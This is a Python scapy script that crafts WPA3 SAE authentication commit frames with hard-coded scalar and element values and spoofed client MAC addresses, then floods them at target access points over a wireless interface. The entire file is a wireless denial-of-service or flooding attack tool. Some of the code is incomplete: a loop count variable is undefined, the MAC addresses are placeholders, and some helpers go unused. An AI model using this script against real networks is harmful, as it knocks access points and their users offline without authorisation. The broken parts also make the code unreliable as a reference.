from scapy.all import *

def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
        ) 

client_list = ['mac_sta_1','mac_sta_2','mac_from_2.4GHz_ap_1','mac_from_2.4GHz_ap_2']
ap_list = ['mac_from_2.4GHz_ap_1','mac_from_2.4GHz_ap_2']
#authentication
def auth_frame():
    mac1 = random.choice(client_list)
    mac2 = random.choice(ap_list)
    return RadioTap()\
      /Dot11(type=0, subtype=11, addr1=mac2, addr2=mac1, addr3=mac2)/Dot11Auth(algo=3, seqnum=1, status=0)

group = '\x13\x00'

def scalar():
    scalar = ['\xad\x8f\xb0\x27\x6b\x51\x82\x58\xc8\x7e\x98\xcc\xb8\x82\xf3\x7d\xaa\x2e\x1d\x2e\x2a\x4f\xbb\x9e\xe9\xab\x13\x81\x0b\xb1\x0c\xff', '\xfe\xa0\x7e\xb5\x65\xb4\x00\x57\x88\x22\x6c\x97\x21\x6b\x7c\x34\x7f\xc1\xf0\xfd\x34\xc1\x74\x2b\x6e\xc4\xe2\x91\x98\x11\xc8\xf8', '\x08\xce\xf4\x10\x91\xbd\x73\x1c\x13\xbd\x68\x41\xb9\xde\xd4\xaf\x99\x91\x84\xc0\x2d\x46\xbd\x92\x95\x96\x00\xc6\x27\x9c\x06\xca', '\x81\xac\xb7\xf8\xbe\x48\x53\x83\xf6\x00\x5b\x15\xe9\x9e\x1b\x8f\x46\xbe\x1c\x6b\xa7\xb1\xcc\x23\x7c\xa5\x8e\x3e\x7f\x39\xf4\x0e', '\xf4\x62\x2f\xce\x04\x8f\xb6\x03\xe0\x38\x30\x28\x96\x21\x20\xfc\xb7\xc6\x53\x53\xf8\xb1\xde\xeb\xda\x56\x2c\x4e\xfa\xb7\x86\x80', '\xb8\x26\x3a\x4b\x72\xb4\x26\x38\x69\x1b\x47\xd4\x42\x78\x5f\x92\xab\x51\x9b\x3e\xff\x59\x85\x63\xc3\xa3\xe1\x91\x44\x46\x99\x0b']
    return random.choice(scalar)

def finite():
    finite = ['\xdd\x63\xa2\x52\x8c\x4b\x3a\xe4\x1d\x57\xe3\x6e\x21\xf4\xfb\x1f\xb2\x8a\xca\x8b\x46\x97\x25\x60\x07\x7c\xeb\x02\xd2\x28\xd7\x53\x2f\xc5\xe6\x22\x06\x02\x5a\xc0\x65\x03\x84\xd7\x80\x06\x0d\x87\x30\x67\xa2\xdb\xf1\xb2\x6a\x41\x1d\x97\x73\xee\x82\xcf\xbb\x4b', '\xf0\x41\x16\xe1\x62\xbb\x12\x50\xe6\x92\x57\xf9\x9e\x41\x42\xe1\xfc\x6d\x72\x1e\x0f\xcb\xec\x7b\xf6\xe7\x8b\xd8\x82\x0d\x75\x28\x35\xca\x44\x3f\x72\xe6\xba\x79\x2a\x82\x23\x0e\xad\xa8\x92\xaa\x48\x29\x44\x04\xf0\xd8\x87\x38\xe8\x0d\x7d\x59\x0a\x6e\x6b\x52', '\x6f\xc8\x11\xe3\xe0\x6f\x27\x61\x8c\x45\xf2\x00\xa4\xbd\xdc\x48\xa0\x74\x33\x36\xb7\xb4\x62\xc1\xa7\x8d\x38\xa7\xbf\xf3\x86\x01\x79\x75\x41\xef\xb6\xe2\xfe\x32\x3b\x84\x6a\x2f\x7c\xb7\x57\x5c\x07\xfa\xf5\xb6\x89\xd1\xc5\x85\x2d\x4f\x4e\x2b\x04\x82\xf4\x0e', '\x69\x42\x1d\x7a\xfc\x4a\x65\x22\x20\x40\xd6\x72\x42\x8e\x4b\x70\xeb\x70\xdf\x94\x5b\xa6\x6b\xb4\x69\xa9\x1c\x6c\x2f\x7e\xca\x1b\xb5\x2f\xb8\x49\x73\xd7\x37\x35\x3a\xb4\xcb\x17\x72\xa0\x6a\x34\x1c\x7c\xbc\xbf\x40\xd8\x76\xc2\xd2\x09\x1b\xcb\xa3\x9f\x59\x1e', '\x31\x45\xea\x13\x4a\xf7\xf7\xf2\xa6\x18\x67\x2f\xa4\x2e\xf8\x35\x1b\x6a\x90\x51\x68\xb8\x8e\x6b\xfd\x71\xf4\x28\xb3\x15\xb2\x4c\x66\xc3\x65\xf6\x35\x81\x61\x7f\xc7\x8c\xce\x0e\xda\xde\x74\xd1\x19\x28\xc4\x60\xbb\x12\x3d\xc3\x83\xe3\x7e\x47\xd4\xa0\x26\xe9', '\x05\xaf\xd3\x99\x6a\x92\x2b\x6e\xde\x4f\x5f\x06\x3e\xcb\xbe\x83\xee\x10\xe9\x77\x8f\x8d\x11\x8b\x6e\xed\x76\xb9\x7b\x8d\x29\xd7\xd4\xd2\x27\x57\x04\xc1\xa2\xff\x01\x82\x34\xde\xef\x54\xe6\x80\x6e\xe0\x83\xb0\x4c\x27\x02\x8d\xce\xbf\x71\xdf\x73\xe7\x92\x96']
    return random.choice(finite)

send_confirm = "\x00\x00"        # send confirm

confirm = "\x3c\x0e\x16\xf2\x05\xbc\x64\xe9\x7e\xa4\xdb\x69\xfe\x28\x16\xf3\xe8\x7b\x4d\x6f\x08\xa9\x66\x9e\x9a\x53\x2d\x13\x64\x5b\xd2\x89"

def construct():
    Auth = auth_frame()
    Scalar = scalar()
    Finite = finite()
    return Auth/group/Scalar/Finite

for n in range(int(count)):
	sendp(construct(), inter=0.0001,count=128, iface='wlan0')
	print ("\nAuth Packet sent: " +str(n))
 

